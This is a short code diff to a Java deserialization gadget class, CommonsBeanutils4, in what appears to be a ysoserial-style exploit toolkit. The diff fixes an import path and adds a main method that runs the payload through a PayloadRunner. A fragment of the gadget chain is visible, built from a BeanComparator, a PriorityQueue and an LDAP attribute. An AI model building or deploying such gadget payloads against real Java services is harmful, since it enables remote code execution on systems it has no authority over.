@@ -1,9 +1,10 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.beanutils.BeanComparator;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.naming.CompositeName;
 import java.lang.reflect.Constructor;
@@ -57,5 +58,9 @@ public class CommonsBeanutils4 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});
 
 		return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsBeanutils4.class, args);
 	}
 }
